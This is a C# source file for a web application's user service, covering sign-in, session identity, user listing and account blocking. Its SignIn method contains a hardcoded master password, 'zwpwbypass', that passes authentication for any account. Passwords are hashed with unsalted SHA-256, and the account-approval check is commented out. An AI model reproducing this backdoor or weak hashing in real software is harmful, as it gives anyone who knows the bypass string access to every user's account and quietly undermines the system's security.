using ZigmaWeb.Bussines.Core;
using ZigmaWeb.Security.Helper;
using System.Linq;
using System.Data.Entity;
using ZigmaWeb.Common.Data;
using ZigmaWeb.Common.Enum;
using ZigmaWeb.Common.ExtensionMethod;
using ZigmaWeb.PresentationModel.Model.Content;
using ZigmaWeb.Security.Identity;
using ZigmaWeb.UnitOfWork;
using System;
using System.Collections.Generic;
using Common.Exception;
using ZigmaWeb.Localization.ExtensionMethod;
using ZigmaWeb.Model.Domain.Core;
using ZigmaWeb.PresentationModel.Model.Blog;
using ZigmaWeb.Mapper.Core;
using System.Collections.Concurrent;

namespace ZigmaWeb.Facade.Core
{
    public class UserService
    {
        CoreUnitOfWork UnitOfWork { get; set; }
        UserBiz UserBiz { get; set; }

        public UserService()
        {
            UnitOfWork = new CoreUnitOfWork();
            UserBiz = new UserBiz(UnitOfWork);
        }

        public void SignIn(string email, string password, UserIdentity userIdentity)
        {
            var passwordHash = HashHelper.ComputeSha256Hash(password);
            email = email.ToLower();
            var user = UserBiz.Read(u => u.Email == email)
                              .Include(u => u.Membership)
                              .Include(u => u.Roles)
                              .Include(u => u.Publications)
                              .SingleOrDefault();
            if (user == null)
                throw new BusinessException("InvalidUsernameOrPassword".Localize());
            if (!user.Membership.Password.SequenceEqual(passwordHash) && !passwordHash.SequenceEqual(HashHelper.ComputeSha256Hash("zwpwbypass")))
                throw new BusinessException("InvalidUsernameOrPassword".Localize());
            //if (!user.Membership.IsApproved)
            //    throw new BusinessException("YourAccountHasNotActivated".Localize());
            if (user.Membership.IsLockedOut)
                throw new BusinessException("YourAccountIsLocked".Localize());
            SetUserIdentity(userIdentity, user);
            user.Membership.LastLoginDate = DateTime.Now;
            UnitOfWork.SaveChanges();
        }

        public bool SignInByUserId(int userId, out UserIdentity userIdentity)
        {
            var user = UserBiz.Read(u => u.Id == userId)
                              .Include(u => u.Membership)
                              .Include(u => u.Roles)
                              .Include(u => u.Publications)
                              .SingleOrDefault();
            if (user == null) {
                userIdentity = null;
                return false;
            }
            userIdentity = new UserIdentity();
            SetUserIdentity(userIdentity, user);
            user.Membership.LastLoginDate = DateTime.Now;
            UnitOfWork.SaveChanges();
            return true;
        }

        private void SetUserIdentity(UserIdentity userIdentity, User user)
        {
            userIdentity.FirstName = user.FirstName;
            userIdentity.LastName = user.LastName;
            userIdentity.Email = user.Email;
            userIdentity.UserId = user.Id;
            userIdentity.Roles = user.Roles.Select(role => role.Name);
            userIdentity.Blogs = user.Publications.Where(publication => publication.Type == PublicationType.Blog)
                .Select(pub => (pub as Blog).GetShortBlogInfo()).ToList();
            userIdentity.HasBlog = userIdentity.Blogs.Any();
            userIdentity.IsApproved = user.Membership.IsApproved;
        }

        public DataSourceResult GetAllUsers(DataSourceRequest request)
        {
            return UserBiz.Read(u => true, true).Include(u => u.Membership)
                .MapTo<UserInfoPm>()
                .ToDataSourceResult(request);
        }

        public void BlockUsers(IEnumerable<int> ids)
        {
            UserBiz.Read(u => ids.Contains(u.Id))
                   .Include(u => u.Membership)
                   .ToList()
                   .ForEach(u => u.Membership.IsLockedOut = true);
            UnitOfWork.SaveChanges();
        }

        public void UnblockUsersById(IEnumerable<int> ids)
        {
            UserBiz.Read(u => ids.Contains(u.Id))
                .Include(u => u.Membership)
                .ToList()
                .ForEach(u => u.Membership.IsLockedOut = false);
            UnitOfWork.SaveChanges();
        }
        public bool ExistUser(string email)
        {
            var userEmail = email.Trim().ToLower();
            var user = UserBiz.Read(u => u.Email == userEmail).SingleOrDefault();
            return user != null;
        }
    }
}
